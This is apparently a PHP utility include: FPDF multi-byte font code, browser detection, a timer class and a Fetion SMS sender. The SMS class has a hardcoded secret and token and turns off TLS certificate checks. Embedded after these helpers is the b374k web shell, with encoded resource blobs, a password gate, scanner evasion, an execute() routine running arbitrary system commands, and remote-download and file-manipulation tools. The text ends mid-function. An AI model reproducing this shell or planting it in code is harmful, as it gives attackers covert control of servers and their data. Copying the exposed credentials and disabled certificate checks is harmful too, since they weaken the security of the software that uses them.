	$this->x = $this->lMargin;
}

function Write($h, $txt, $link='')
{
	if($this->CurrentFont['type']=='Type0')
		$this->MBWrite($h,$txt,$link);
	else
		parent::Write($h,$txt,$link);
}

function MBWrite($h, $txt, $link)
{
	// Multi-byte version of Write()
	$cw = &$this->CurrentFont['cw'];
	$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		// Check if ASCII or MB
		$ascii = (ord($c)<128);
		if($c=="\n")
		{
			// Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
			continue;
		}
		if(!$ascii || $c==' ')
			$sep = $i;
		$l += $ascii ? $cw[$c] : 1000;
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1 || $i==$j)
			{
				if($this->x>$this->lMargin)
				{
					// Move to next line
					$this->x = $this->lMargin;
					$this->y += $h;
					$w = $this->w-$this->rMargin-$this->x;
					$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
					$i++;
					$nl++;
					continue;
				}
				if($i==$j)
					$i += $ascii ? 1 : 2;
				$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),0,2,'',0,$link);
				$i = ($s[$sep]==' ') ? $sep+1 : $sep;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
		}
		else
			$i += $ascii ? 1 : 2;
	}
	// Last chunk
	if($i!=$j)
		$this->Cell($l/1000*$this->FontSize,$h,substr($s,$j,$i-$j),0,0,'',0,$link);
}

function _putType0($font)
{
	// Type0
	$this->_newobj();
	$this->_out('<</Type /Font');
	$this->_out('/Subtype /Type0');
	$this->_out('/BaseFont /'.$font['name'].'-'.$font['CMap']);
	$this->_out('/Encoding /'.$font['CMap']);
	$this->_out('/DescendantFonts ['.($this->n+1).' 0 R]');
	$this->_out('>>');
	$this->_out('endobj');
	// CIDFont
	$this->_newobj();
	$this->_out('<</Type /Font');
	$this->_out('/Subtype /CIDFontType0');
	$this->_out('/BaseFont /'.$font['name']);
	$this->_out('/CIDSystemInfo <</Registry '.$this->_textstring('Adobe').' /Ordering '.$this->_textstring($font['registry']['ordering']).' /Supplement '.$font['registry']['supplement'].'>>');
	$this->_out('/FontDescriptor '.($this->n+1).' 0 R');
	if($font['CMap']=='ETen-B5-H')
		$W = '13648 13742 500';
	elseif($font['CMap']=='GBK-EUC-H')
		$W = '814 907 500 7716 [500]';
	else
		$W = '1 ['.implode(' ',$font['cw']).']';
	$this->_out('/W ['.$W.']>>');
	$this->_out('endobj');
	// Font descriptor
	$this->_newobj();
	$this->_out('<</Type /FontDescriptor');
	$this->_out('/FontName /'.$font['name']);
	$this->_out('/Flags 6');
	$this->_out('/FontBBox [0 -200 1000 900]');
	$this->_out('/ItalicAngle 0');
	$this->_out('/Ascent 800');
	$this->_out('/Descent -200');
	$this->_out('/CapHeight 800');
	$this->_out('/StemV 50');
	$this->_out('>>');
	$this->_out('endobj');
}
}

function browser(){
if(strpos($_SERVER["HTTP_USER_AGENT"],"MSIE 8.0"))  
return "ie";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"MSIE 7.0"))  
return "ie";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"MSIE 6.0"))  
return "ie";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"Firefox/3"))  
return "firefox";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"Firefox/2"))  
return "firefox";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"Chrome"))  
return "chrome";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"Safari"))  
return "safari";  
else if(strpos($_SERVER["HTTP_USER_AGENT"],"Opera"))  
return "opera";  
else return $_SERVER["HTTP_USER_AGENT"];
}

/*

$runtime= new runtime;
$runtime->start();

$runtime->stop();
echo "页面执行时间: ".$runtime->spent()." 毫秒";  
 
*/
class runtime
{ 
    var $StartTime = 0; 
    var $StopTime = 0; 
  
    function get_microtime() 
    { 
        list($usec, $sec) = explode(' ', microtime()); 
        return ((float)$usec + (float)$sec); 
    } 
  
    function start() 
    { 
        $this->StartTime = $this->get_microtime(); 
        return $this->StartTime;
    } 
  
    function stop() 
    { 
        $this->StopTime = $this->get_microtime(); 
        return $this->StopTime;        
    } 
  
    function spent() 
    { 
        return round(($this->StopTime - $this->StartTime) * 1000, 1); 
    } 
  
}
?>

<?php 
/**
 * PHP飞信发送类
 *
 * @author quanhengzhuang <blog.quanhz.com>
 * @version 1.5.0
 */
class fetion_class{
	
	var $appid = '11256';
	var $secret = '6c323e8b6b1cf76917d920570cfcbfc1';
	var $token = '510212198004250318';
	var $gz = '4021000783';
	var $openid = '637497536';
	
	function getaccesstoken(){
          $url = 'http://221.176.30.209/op/open3/index.php/token/?grant_type=client_credential&appid='.encodeuri($this->appid).'&secret='.encodeuri($this->secret);
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray);   
          curl_close($ch);		
          return $jsonarray;
	}
	
	function getuseropenid($access_token,$next_openid){
          $url = 'http://221.176.30.209/op/open3/index.php/user/get/?access_token='.encodeuri($access_token).'&next_openid='.encodeuri($next_openid);
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray);   
          curl_close($ch);		
          return $jsonarray;
	}	
	
	function sendtextmsg($access_token,$openid,$content){
          $url = 'http://221.176.30.209/op/open3/index.php/customer/send/?access_token='.encodeuri($access_token);
          $postdata = '{"touser":"'.$openid.'","msgtype":"text","text":{"content":"'.$content.'"}}';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);           
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray);   
          curl_close($ch);		
          return $jsonarray;
	}	

	function sendmsg($user,$content){
		$getaccesstoken=$this->getaccesstoken();
		//$getuseropenid=$this->getuseropenid($getaccesstoken['access_token']);
		if($user==''){//$getuseropenid['data']['openid'][0]
			$sendtextmsg=$this->sendtextmsg($getaccesstoken['access_token'],$this->openid,$content);
		}
		//print_r($sendtextmsg);		
 	}
}

?>

<?php
function b374k(){
/*
	b374k shell 3.2.3
	Jayalah Indonesiaku
	(c)2016
	https://github.com/b374k/b374k

*/
$GLOBALS['module_to_load'] = array("explorer", "terminal", "eval", "convert", "database", "info", "mail", "network", "processes");$GLOBALS['resources']['b374k'] = "hVXZrrM4En6gjARhC8yoL9hXQ9gDd2xhJ5yw8/Tj/Oef7tPSSG3JwjZVXy1flZ0nc/Lvuk/KAhmH8j9pMhUU8a864CxnQ3W5fLFwmK5fiX4JV9xny9o8G32+Txphqs9CfjhSqDheisVojklHbHNcLDN17HJaGkpDHGhdFDpklnXd/aNwaGMgVWgoXoHVm2vqktW3PEmkD/Z7CBtSKFwVYXOX81wdh/mYNmh9uy2IWnNjLKB1cAYmEK+bjQWvxK+orA+8oiX9CB/f0dm1akNfVGEnrKGaM/na5bJYFvJ1SgdAFVAf+rRGvU999mkYoJFL16pSUlBmy+WJUVupTTGtU6XK9HlOSHG4FvwFHNcGCOKuChFmNCJqehEG3K0EDbuDmt4+06zR3RReV7N5HebBlir/ezZEeVe0Nm5G1xGjP/3Jeqe/u9orV5zNquk1x3PcGLLT6JkjPujd8lrSONnDONXDeED9+noWIYlGj3KG+s0PXDF+mE3WdzCGbk1r7ojliIpCbc0fNqPW6l85gHH+tAnPlt85WSKMmQ28qjKe3o2GXWHOiTTcl+wcIUec6XlonSgOmgmv1cBI6Od3roxffDJE9GBX4BKbgV1n4/jLZoY7bhxGjNpXaK6wlHEwS3b8yX+TYuhayNJmnOICeOYMlG6LXcaFMUH/teZTS3ENIE+QU2EUIOdVLjNHIDNrCjm1v/0vfbla4fmZyMymiqZn1uwrwLoF2sGzo/3WF6+m1XYL9KlKe7NzfZifT63w5JiENgVaRzIhx0CwCSCUB/AkCaCS4Ag5Z6LgtDx2N89Ysv3oBx60jwdzDLn5gdf+Hc//R7x7zdIffjwfpRw5OJJH3MVifMD8lL9zSCUheeayBLkKNAfG/pE3+g72xutwRB81m2gDTblZgroD3z9t3xRNVMTtE5CwfnGzDTgH1sP/8GBumjy8dung/MBz/o53/iPe+vHdwP9PLX5qlGd+1aPfOvK33He//eo/D/4XGCKTpSbBAlSVg+XT51mtIveF8kPtc+/oh+s7XKA0yVMyc1czK0m5FcizEtp3j9Uobo/VtFeRWwLVL9WirnUKcXlW93Szk17izDlPcX1EFbigsg1m4Bu3L7f8clGbN3VPcKlMC+WaGsjbLV5xpLikFwYn4nK/PwUux5s7Te7nMFjWuTxPwuXfN+fWDrpVEkUS5Ex458opjhDcjLNQQz05SfRiic/yxJYClJJ0GalwMFCLbU6gX550e9lKYn/sJnMVyGGiXy3NOwrpYvKrdGmF09vrvuSXhePUbezJ83DWELlMCqstgB6mN1DFTqlRJFHYXuoQS8VC57CK9a0j0aZJLwEtMql9hnM1CqajXPlsJmLrdJKyeyDCFF28zPzy/BwbK7F5Xa06LEld9yvNS5eEenjezdVXtzNGOeQowW+W0C5CpCdqTQ2rFy2snHfB5tLaxnjaATL3yDQw3ntK3pgFvqi3FeCPK7MNmeabrjgNujuF9XNHOT3yyrwS9lo0uWcT88uuFc0DDYnnO67Z2Iz9YA/06Nlnx6J76pWMd30jVPZGJDyv1qD4ioVxDtUloC8V2z4sSC9TJIZ5vFfrmY+EPCJSo3cjcFMDdBGWV3zCZ+Lga+VMThJhf7Wtqk8CO8uPgbFdr+pAL/ElXfq9aIzto2QY6WVupahhDceF44u7I/TE31hQI2KEiKvhc7bGjxbwGOxaCTKptWrZ3XMauYmqNLoVb4PhzUbTO0RLQ3T8zTOfK3wjk+6V52G/Lhhp7t65JjIFRMMJHjrilgb9VGKGbSbA6/4pfXGV29gx2755aq2/juOiGvnu325kquDsPUi7EG/wO6zHjEhlVTHv8G4hcjaT8nnqPPRmhdlaOYGmrsFcoggzVNpbBl9f4TlK6bWQoqUOnnnK8plsdesZ7WhmFVsSuPOx1BHp45oUpElV7XhhE/TYvfFXKszKl7t7TkzpzJO8l6zI9ki1soLaypb96wl3/cBydJKPVPWP/wI=";
$GLOBALS['resources']['mime'] = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
$GLOBALS['resources']['arrow'] = "FZXHDqtYDIYfKCPRS2Z0F4cSem+BHfVQA6HD00+uF/Zny2XzSy7SNf23GVJYItMH/pelS0mT/zQhZ7kHqklwBD8zvaAWA/gj/m8KIA/iX+Du8jOjfwv8m1Oit/Gjxfs5XYSyR7wZ9sdiLPaiE7rxwYZvDz3z0G0fN9Pt1PqiDLuyRgzA7sVpo2NvL3Cdy6p1eSS3Um21eZqfW2uc6Xc9STYjG0E8zybZ3lxYrGLgmij6FTgD+oE1fHzRyB9IXpIFlT+6J8XARNRivqAELyNW694fBYKgdQ54i2RquOgoIwOqEpRK6G66qk4HjFCAWX9NRp5cU6hMsdvSQhiGCXr7Hmfyl/TaR9KwjDxldWNp9wx7zux2sY0uWUABDxUQWhoG2Dt8WlOYIuH8fjpej0l0Ag3k01AHYyLNNo7exzAS7jczTk5oogzNlETVL5g2TcLYQI7n5y+9dRXzgN4z19fKr4mPCsLm+Z4fhc9nFab7ORjMJSOarH0XxJM8bMHBKhENzgreEnB4RwFNgUb1wm6yMFd9syRt0rPChFJ4e7D2md63/czFE+B2LsNxEpkwZeLntSUuUyuCTZGb0bYMBi9PfT3ACaK/fYdUE8GzeuLXbI0WiI/zRT7snWMV7vXc0BLFwQvIfSYKjgtoIiKJO8reFV4ahnMA1JRdKx1HMiyyMoZnMgQX7W2Jb4/tudaDRtJOUgZY5FAFbpEnYQiABEU5E+XyKu3pqRizh676B29Ssyk1ZZcZwLKwlms5igcnOp1+1ekSSQK9Lv0S2ZnH92jrgEbjN0b9dO44OK4Z4mIc2VxoxxZepzO+WLzcJrra8wYG5RKqDNe3w+ODQnrPzk+OyZo+z8kL8HK3XNhcc7Cy92cVYW3WsVZpSzZCVEopMlUun/XlOFzTWnVpt8ShAFmZsxVB3sNWkvLAUSxdyhWMgea1yH4jJVBb3QaAFPrxU3v6VD7DsFpOCVxSwRZsTFsw6Ga1qFmVUxS3tV9WjJkhkxZAMaHLA7+0NJ7dy9abkmqhppR9oAYIJM9g3OHTD+8+wQtkYMCiHSxQxMEzWvkktKPzgskfd/F3m4WH09lAfUtThQ+JA2pMvbnJ6t8SLwdtzXvR47Ze0Z0VkC5F6c7eSxl6n8/pudIYGl89MitzIHEuXxVYD3J+qt9oQ4PJqsQjEOewetHZEUf8UCRYjHw7vmxoe0Bjtx59p4PftRrDqXDRXTLqQ1NGLVE613PVZmyaiRe6SnV9b8SCdA91B7a1hB8RS3xWHIXdY6T9TwCc0xRi3IZGTB74VSs6rLkrXVm0jVjjQNstEz3DCNOpVy3Xk91cVJxbaOKEbFvrQCy2fxSUzhanvPq5bmccNWTPG3UbMsXoPWSS5TTTvo/W8LsiZ6Sdzdm2qGSqJapvuncb/jlI1c4i60NN53TasogwL0a/GFnyF4lgiGXW2N7BNyL5EEyQA42LdZtao2S9f+reA04QDbaEQtRg0YRlb/E0ksyci4MM1HlVvvqQlz0aqMXesslvqz7Y4baL0WvNHvflRnLNxLR5IFfb9KrZT97Lotz8OFtJJj9ugSFhVYy9nzcuRvC+vbF6zdrWpYtPek+rxjaeMog4pvOIbJ3wOTQmFb3d/atN9HV7ZsuZFAIRngh0oVQKZXb+fgBOdQNKnDsVQvjnz/8=";
$GLOBALS['ver'] = "3.2.3";
$GLOBALS['title'] = "b374k"; @ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','1');
@ini_set('display_startup_errors','1');
@ini_set('log_errors','0');
@set_time_limit(0);
@clearstatcache(); if(!function_exists('auth')){ function auth(){ if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){ $c = $_COOKIE; $p = $_POST; if(isset($p['pass'])){ $your_pass = sha1(md5($p['pass'])); if($your_pass==$GLOBALS['pass']){ setcookie("pass", $your_pass, time()+36000, "/"); header("Location: ".get_self()); } } if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){ $res = "<!doctype html> <html> <head> <meta charset='utf-8'> <meta name='robots' content='noindex, nofollow, noarchive'> <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'> </head> <body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p> <script type='text/javascript'> var d = document; d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\"); d.getElementById('pass').focus(); d.getElementById('pass').setAttribute('autocomplete', 'off'); </script> </body></html> "; echo $res; die(); } } }
} if(!function_exists('get_server_info')){ function get_server_info(){ $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"]; $server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR']; $server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time()); $server_info['uname'] = php_uname(); $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":''; $server_info['software'] = $server_software." PHP ".phpversion(); return $server_info; }
} if(!function_exists('get_self')){ function get_self(){ $query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:""; return html_safe($_SERVER["REQUEST_URI"].$query); }
} if(!function_exists('get_post')){ function get_post(){ return fix_magic_quote($_POST); }
} if(!function_exists('get_nav')){ function get_nav($path){ return parse_dir($path); }
} if(!function_exists('get_cwd')){ function get_cwd(){ $cwd = getcwd().DIRECTORY_SEPARATOR; if(!isset($_COOKIE['cwd'])){ setcookie("cwd", $cwd); } else{ $cwd_c = rawurldecode($_COOKIE['cwd']); if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR; else setcookie("cwd", $cwd); } return $cwd; }
} if(!function_exists('wrap_with_quotes')){ function wrap_with_quotes($str){ return "\"".$str."\""; }
} if(!function_exists('get_resource')){ function get_resource($type){ if(isset($GLOBALS['resources'][$type])){ return gzinflate(base64_decode($GLOBALS['resources'][$type])); } return false; }
} if(!function_exists('block_bot')){ function block_bot(){ if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){ header("HTTP/1.0 404 Not Found"); header("Status: 404 Not Found"); die(); } elseif(!isset($_SERVER['HTTP_USER_AGENT'])){ header("HTTP/1.0 404 Not Found"); header("Status: 404 Not Found"); die(); } }
} if(!function_exists('is_win')){ function is_win(){ return (strtolower(substr(php_uname(),0,3)) == "win")? true : false; }
} if(!function_exists('fix_magic_quote')){ function fix_magic_quote($arr){ $quotes_sybase = strtolower(ini_get('magic_quotes_sybase')); if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){ if(is_array($arr)){ foreach($arr as $k=>$v){ if(is_array($v)) $arr[$k] = clean($v); else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)); } } } return $arr; }
} if(!function_exists('execute')){ function execute($code){ $output = ""; $code = $code." 2>&1"; if(is_callable('system') && function_exists('system')){ ob_start(); @system($code); $output = ob_get_contents(); ob_end_clean(); if(!empty($output)) return $output; } elseif(is_callable('shell_exec') && function_exists('shell_exec')){ $output = @shell_exec($code); if(!empty($output)) return $output; } elseif(is_callable('exec') && function_exists('exec')){ @exec($code,$res); if(!empty($res)) foreach($res as $line) $output .= $line; if(!empty($output)) return $output; } elseif(is_callable('passthru') && function_exists('passthru')){ ob_start(); @passthru($code); $output = ob_get_contents(); ob_end_clean(); if(!empty($output)) return $output; } elseif(is_callable('proc_open') && function_exists('proc_open')){ $desc = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $proc = @proc_open($code, $desc, $pipes, getcwd(), array()); if(is_resource($proc)){ while($res = fgets($pipes[1])){ if(!empty($res)) $output .= $res; } while($res = fgets($pipes[2])){ if(!empty($res)) $output .= $res; } } @proc_close($proc); if(!empty($output)) return $output; } elseif(is_callable('popen') && function_exists('popen')){ $res = @popen($code, 'r'); if($res){ while(!feof($res)){ $output .= fread($res, 2096); } pclose($res); } if(!empty($output)) return $output; } return ""; }
} if(!function_exists('html_safe')){ function html_safe($str){ return htmlspecialchars($str, 2 | 1); }
} if(!function_exists('parse_dir')){ function parse_dir($path){ $path = realpath($path).DIRECTORY_SEPARATOR; $paths = explode(DIRECTORY_SEPARATOR, $path); $res = ""; for($i = 0; $i < sizeof($paths)-1; $i++){ $x = ""; for($j = 0; $j <= $i; $j++) $x .= $paths[$j].DIRECTORY_SEPARATOR; $res .= "<a class='navbar' data-path='".html_safe($x)."'>".html_safe($paths[$i])." ".DIRECTORY_SEPARATOR." </a>"; } if(is_win()) $res = get_drives().$res; return trim($res); }
} if(!function_exists('zip')){ function zip($files, $archive){ $status = false; if(!extension_loaded('zip')) return $status; if(class_exists("ZipArchive")){ $zip = new ZipArchive(); if(!$zip->open($archive, 1)) return $status; if(!is_array($files)) $files = array($files); foreach($files as $file){ $file = str_replace(get_cwd(), '', $file); $file = str_replace('\\', '/', $file); if(is_dir($file)){ $filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1); foreach($filesIterator as $iterator){ $iterator = str_replace('\\', '/', $iterator); if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue; if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/')); else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator)); } } elseif(is_file($file)) $zip->addFromString(basename($file), read_file($file)); } if($zip->getStatusString()!==false) $status = true; $zip->close(); } return $status; }
} if(!function_exists('compress')){ function compress($type, $archive, $files){ if(!is_array($files)) $files = array($files); if($type=='zip'){ if(zip($files, $archive)) return true; else return false; } elseif(($type=='tar')||($type=='targz')){ $archive = basename($archive); $listsBasename = array_map("basename", $files); $lists = array_map("wrap_with_quotes", $listsBasename); if($type=='tar') execute("tar cf \"".$archive."\" ".implode(" ", $lists)); elseif($type=='targz') execute("tar czf \"".$archive."\" ".implode(" ", $lists)); if(is_file($archive)) return true; else return false; } return false; }
} if(!function_exists('decompress')){ function decompress($type, $archive, $path){ $path = realpath($path).DIRECTORY_SEPARATOR; $status = false; if(is_dir($path)){ chdir($path); if($type=='unzip'){ if(class_exists('ZipArchive')){ $zip = new ZipArchive(); $target = $path.basename($archive,".zip"); if($zip->open($archive)){ if(!is_dir($target)) mkdir($target); if($zip->extractTo($target)) $status = true; $zip->close(); } } } elseif($type=='untar'){ $target = basename($archive,".tar"); if(!is_dir($target)) mkdir($target); $before = count(get_all_files($target)); execute("tar xf \"".basename($archive)."\" -C \"".$target."\""); $after = count(get_all_files($target)); if($before!=$after) $status = true; } elseif($type=='untargz'){ $target = ""; if(strpos(strtolower($archive), ".tar.gz")!==false) $target = basename($archive,".tar.gz"); elseif(strpos(strtolower($archive), ".tgz")!==false) $target = basename($archive,".tgz"); if(!is_dir($target)) mkdir($target); $before = count(get_all_files($target)); execute("tar xzf \"".basename($archive)."\" -C \"".$target."\""); $after = count(get_all_files($target)); if($before!=$after) $status = true; } } return $status; }
} if(!function_exists('download')){ function download($url ,$saveas){ if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false; $filename = basename($url); if($content = read_file($url)){ if(is_file($saveas)) unlink($saveas); if(write_file($saveas, $content)){ return true; } } $buff = execute("wget ".$url." -O ".$saveas); if(is_file($saveas)) return true; $buff = execute("curl ".$url." -o ".$saveas); if(is_file($saveas)) return true; $buff = execute("lwp-download ".$url." ".$saveas); if(is_file($saveas)) return true; $buff = execute("lynx -source ".$url." > ".$saveas); if(is_file($saveas)) return true; return false; }
} if(!function_exists('get_fileperms')){ function get_fileperms($file){ if($perms = @fileperms($file)){ $flag = 'u'; if(($perms & 0xC000) == 0xC000)$flag = 's'; elseif(($perms & 0xA000) == 0xA000)$flag = 'l'; elseif(($perms & 0x8000) == 0x8000)$flag = '-'; elseif(($perms & 0x6000) == 0x6000)$flag = 'b'; elseif(($perms & 0x4000) == 0x4000)$flag = 'd'; elseif(($perms & 0x2000) == 0x2000)$flag = 'c'; elseif(($perms & 0x1000) == 0x1000)$flag = 'p'; $flag .= ($perms & 00400)? 'r':'-'; $flag .= ($perms & 00200)? 'w':'-'; $flag .= ($perms & 00100)? 'x':'-'; $flag .= ($perms & 00040)? 'r':'-'; $flag .= ($perms & 00020)? 'w':'-'; $flag .= ($perms & 00010)? 'x':'-'; $flag .= ($perms & 00004)? 'r':'-'; $flag .= ($perms & 00002)? 'w':'-'; $flag .= ($perms & 00001)? 'x':'-'; return $flag; } else return "???????????"; }
} if(!function_exists('format_bit')){ function format_bit($size){ $base = log($size) / log(1024); $suffixes = array('B','KB','MB','GB','TB','PB','EB','ZB','YB'); return round(pow(1024, $base - floor($base)),2)." ".$suffixes[floor($base)]; }
} if(!function_exists('get_filesize')){ function get_filesize($file){ $size = @filesize($file); if($size!==false){ if($size<=0) return 0; return format_bit($size); } else return "???"; }
} if(!function_exists('get_filemtime')){ function get_filemtime($file){ return @date("d-M-Y H:i:s", filemtime($file)); }
} if(!function_exists('get_fileowner')){ function get_fileowner($file){ $owner = "?:?"; if(function_exists("posix_getpwuid")){ $name = posix_getpwuid(fileowner($file)); $group = posix_getgrgid(filegroup($file)); $owner = $name['name'].":".$group['name']; } return $owner; }
} if(!function_exists('rmdirs')){ function rmdirs($dir, $counter = 0){ if(is_dir($dir)) $dir = realpath($dir).DIRECTORY_SEPARATOR; if($dh = opendir($dir)){ while(($f = readdir($dh))!==false){ if(($f!='.')&&($f!='..')){ $f = $dir.$f; if(@is_dir($f)) $counter += rmdirs($f); else{ if(unlink($f)) $counter++; } } } closedir($dh); if(rmdir($dir)) $counter++;; } return $counter; }
} if(!function_exists('copys')){ function copys($source , $target ,$c=0){ $source = realpath($source).DIRECTORY_SEPARATOR; if($dh = opendir($source)){ if(!is_dir($target)) mkdir($target); $target = realpath($target).DIRECTORY_SEPARATOR; while(($f = readdir($dh))!==false){ if(($f!='.')&&($f!='..')){ if(is_dir($source.$f)){ copys($source.$f, $target.$f, $c); } else{ if(copy($source.$f, $target.$f)) $c++; } } } closedir($dh); } return $c; }
} if(!function_exists('get_all_files')){ function get_all_files($path){ $path = realpath($path).DIRECTORY_SEPARATOR; $files = glob($path.'*'); for($i = 0; $i<count($files); $i++){ if(is_dir($files[$i])){ $subdir = glob($files[$i].DIRECTORY_SEPARATOR.'*'); if(is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir); } } return $files; }
} if(!function_exists('read_file')){ function read_file($file){ $content = false; if($fh = @fopen($file, "rb")){ $content = ""; while(!feof($fh)){ $content .= fread($fh, 8192); } } return $content; }
} if(!function_exists('write_file')){ function write_file($file, $content){ if($fh = @fopen($file, "wb")){ if(fwrite($fh, $content)!==false) return true; } return false; }
